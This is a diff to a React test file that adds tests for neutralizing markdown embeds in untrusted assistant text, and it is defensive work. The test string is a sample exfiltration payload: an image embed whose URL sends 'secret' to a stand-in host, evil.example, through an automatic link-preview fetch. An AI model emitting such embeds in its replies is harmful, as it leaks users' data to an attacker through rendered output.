@@ -4,6 +4,13 @@
 import { describe, it, expect, vi, beforeEach } from 'vitest'
 import { render, fireEvent } from '@testing-library/react'
 import { MarkdownLite } from './MarkdownLite'
+import { neutralizeEmbeds } from '../../core/markdown/neutralizeEmbeds'
+
+const { fetchLinkPreviewMock } = vi.hoisted(() => ({ fetchLinkPreviewMock: vi.fn() }))
+vi.mock('../../core/linkPreview', () => ({
+  fetchLinkPreview: (...a: unknown[]) => fetchLinkPreviewMock(...a),
+  domainOf: (u: string) => u,
+}))
 
 // Mock external dependencies that are difficult to render in tests
 vi.mock('../../context/NotesContext', () => ({
@@ -305,6 +312,22 @@ describe('MarkdownLite', () => {
       expect(link.tagName).toBe('A')
       fireEvent.click(link)
       expect(openUrlMock).toHaveBeenCalledWith('https://example.com')
+    })
+  })
+
+  describe('untrusted (assistant) text', () => {
+    const injected = 'Answer. ![webpage](https://evil.example/?d=secret)'
+    beforeEach(() => fetchLinkPreviewMock.mockResolvedValue({ url: '', title: '', description: '', image: '', favicon: '', siteName: '' }))
+
+    it('a raw webpage embed fetches its preview on render (why neutralizing matters)', () => {
+      render(<MarkdownLite content={injected} lazy={false} />)
+      expect(fetchLinkPreviewMock).toHaveBeenCalledWith('https://evil.example/?d=secret')
+    })
+
+    it('a neutralized embed renders as a link and fetches nothing', () => {
+      const { getByText } = render(<MarkdownLite content={neutralizeEmbeds(injected)} lazy={false} />)
+      expect(fetchLinkPreviewMock).not.toHaveBeenCalled()
+      expect(getByText('webpage').tagName).toBe('A')
     })
   })
 })
